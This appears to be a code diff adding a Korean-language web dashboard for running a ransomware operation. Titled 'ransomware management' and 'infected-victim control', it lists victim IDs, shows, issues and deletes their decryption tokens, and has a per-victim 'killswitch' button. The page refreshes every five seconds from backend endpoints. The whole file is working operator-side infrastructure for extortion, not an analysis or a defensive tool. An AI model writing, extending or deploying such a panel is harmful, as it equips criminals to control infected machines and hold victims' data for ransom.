@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>랜섬웨어 관리</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f8f8;
+      padding: 30px;
+    }
+    h1 { text-align: center; color: #b30000; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 30px;
+      background-color: #fff;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 10px;
+      text-align: center;
+      font-size: 15px;
+    }
+    th { background-color: #eee; color: #333; }
+    button {
+      padding: 6px 12px;
+      font-weight: bold;
+      background-color: #0275d8;
+      border: none;
+      color: white;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover { opacity: 0.9; }
+    button:disabled { background-color: #aaa; cursor: not-allowed; opacity: 0.5; }
+    button.delete { background-color: #d9534f; }
+    button.killswitch { background-color: #b30000; }
+    .token { font-family: monospace; color: #007f00; word-break: break-all; }
+  </style>
+  <script>
+    async function fetchAll() {
+      const idRes = await fetch("/api/infected_ids");
+      const ids = await idRes.json();
+      const tokenRes = await fetch("/api/tokens");
+      const tokens = await tokenRes.json();
+      const tbody = document.getElementById("data-body");
+      tbody.innerHTML = "";
+      for (const id of ids) {
+        const tr = document.createElement("tr");
+        // 감염자 ID
+        const tdId = document.createElement("td");
+        tdId.textContent = id;
+        tr.appendChild(tdId);
+        // 토큰
+        const tdToken = document.createElement("td");
+        tdToken.className = "token";
+        const tokenEntry = Object.entries(tokens).find(([t, mappedId]) => mappedId === id);
+        const token = tokenEntry ? tokenEntry[0] : null;
+        tdToken.textContent = token || "-";
+        tr.appendChild(tdToken);
+        // 생성 버튼
+        const tdCreate = document.createElement("td");
+        const createBtn = document.createElement("button");
+        createBtn.textContent = token ? "재발급" : "토큰 생성";
+        createBtn.onclick = () => generateToken(id);
+        tdCreate.appendChild(createBtn);
+        tr.appendChild(tdCreate);
+        // 삭제 버튼
+        const tdDelete = document.createElement("td");
+        const deleteBtn = document.createElement("button");
+        deleteBtn.textContent = "삭제";
+        deleteBtn.className = "delete";
+        if (token) {
+          deleteBtn.onclick = () => deleteToken(token);
+        } else {
+          deleteBtn.disabled = true;
+        }
+        tdDelete.appendChild(deleteBtn);
+        tr.appendChild(tdDelete);
+        // === 킬스위치 버튼 ===
+        const tdKill = document.createElement("td");
+        const killBtn = document.createElement("button");
+        killBtn.textContent = "킬스위치";
+        killBtn.className = "killswitch";
+        killBtn.onclick = async function() {
+          const yes = confirm("이 감염자에게 킬스위치를 발동하시겠습니까?");
+          if (!yes) return;
+          await fetch("/api/killswitch", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ kill: true, id })
+          });
+          alert("해당 감염자에게 킬스위치 발동됨!");
+          fetchAll();
+        };
+        tdKill.appendChild(killBtn);
+        tr.appendChild(tdKill);
+
+        tbody.appendChild(tr);
+      }
+    }
+    async function generateToken(id) {
+      const res = await fetch("/api/generate_token", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id })
+      });
+      const data = await res.json();
+      if (data.token) {
+        alert("새 토큰이 발급되었습니다:\n\n" + data.token);
+        fetchAll();
+      } else {
+        alert("토큰 생성 실패: " + data.error);
+      }
+    }
+    async function deleteToken(token) {
+      const confirmDelete = confirm("정말로 이 토큰을 삭제하시겠습니까?");
+      if (!confirmDelete) return;
+      const res = await fetch("/api/delete_token", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token })
+      });
+      const result = await res.json();
+      if (result.status === "deleted") {
+        alert("토큰이 삭제되었습니다.");
+        fetchAll();
+      } else {
+        alert("삭제 실패: " + result.error);
+      }
+    }
+    window.onload = () => {
+      fetchAll();
+      setInterval(fetchAll, 5000);
+    };
+  </script>
+</head>
+<body>
+  <h1>감염자 제어</h1>
+  <table>
+    <thead>
+      <tr>
+        <th>감염자 ID</th>
+        <th>복호화 토큰</th>
+        <th>토큰 생성</th>
+        <th>토큰 삭제</th>
+        <th>킬스위치</th>
+      </tr>
+    </thead>
+    <tbody id="data-body"></tbody>
+  </table>
+</body>
+</html>
